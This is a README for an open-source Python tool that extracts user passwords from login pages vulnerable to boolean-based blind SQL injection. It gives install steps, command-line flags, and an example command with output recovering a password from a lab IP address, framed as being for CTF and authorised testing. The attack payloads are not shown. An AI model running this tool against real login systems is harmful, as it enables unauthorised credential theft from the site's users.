# Blind-SQL-Injection-Password-Extractor

A lightweight, automated Python script designed to extract passwords from login panels vulnerable to Boolean-Based Blind SQL Injection.

This tool automates the "Guess Who" game against a database by iterating through characters and comparing their ASCII values, ensuring accurate, case-sensitive results.

## Features

* **Case-Sensitive Extraction:** Uses `ASCII()` conversion to distinguish between uppercase and lowercase letters (e.g., 'a' vs 'A').
* **Fully Argument-Based:** No need to hardcode values in the script. Pass the target, user, and success message via CLI.
* **Real-Time Feedback:** Displays the password character by character as it is discovered.
* **Payload Encoding:** Automatically handles URL encoding via the `requests` library.

## Prerequisites

* Python 3.x
* `requests` library

## Installation

1.  Clone this repository:
    ```bash
    git clone https://github.com/nekr0ff/Blind-SQL-Injection-Password-Extractor.git
    cd Blind-SQL-Injection-Password-Extractor
    ```

2.  Install the dependencies:
    ```bash
    pip install requests
    ```

## Usage

Run the script using Python 3. You need to identify the **success message** (the text that appears on the page *only* when the login/injection is successful) beforehand.

```bash
python3 sqli_credentials.py -u [USERNAME] -t [URL] -m "[SUCCESS_MESSAGE]"
```

### Arguments

| Flag | Long Flag   | Description                                                                 |
| :--- | :---------- | :-------------------------------------------------------------------------- |
| `-u` | `--user`    | The username you want to target (e.g., `admin`, `smokey`).                  |
| `-t` | `--target`  | The full URL where the login POST request is sent (e.g., `http://.../login`).|
| `-m` | `--message` | The string that appears in the response *only* when the injection is successful (The "Oracle"). |
| `-h` | `--help`    | Shows the help menu and usage instructions.                                 |


## Example Scenario
Imagine a scenario where:

Target URL: http://10.10.10.55/login

Vulnerable User: smokey

Behavior: When the query is true, the page says "Welcome to the index page".

Command:

```Bash
python3 sqli_credentials.py -u smokey -t [http://10.10.10.55/login](http://10.10.10.55/login) -m "Welcome to the index page"
```
Output:

```Plaintext
[+] Attacking the user smokey in [http://10.10.10.55/login](http://10.10.10.55/login)
[-] Actual password: P
[-] Actual password: P@
[-] Actual password: P@s
...
[SUCCESS] The password for the user smokey is: P@ssw0rd123
```

## Disclaimer
For Educational Purposes Only. This script is intended for Capture The Flag (CTF) challenges and authorized security testing. Do not use this tool on systems you do not own or do not have explicit permission to test. The author is not responsible for any misuse.
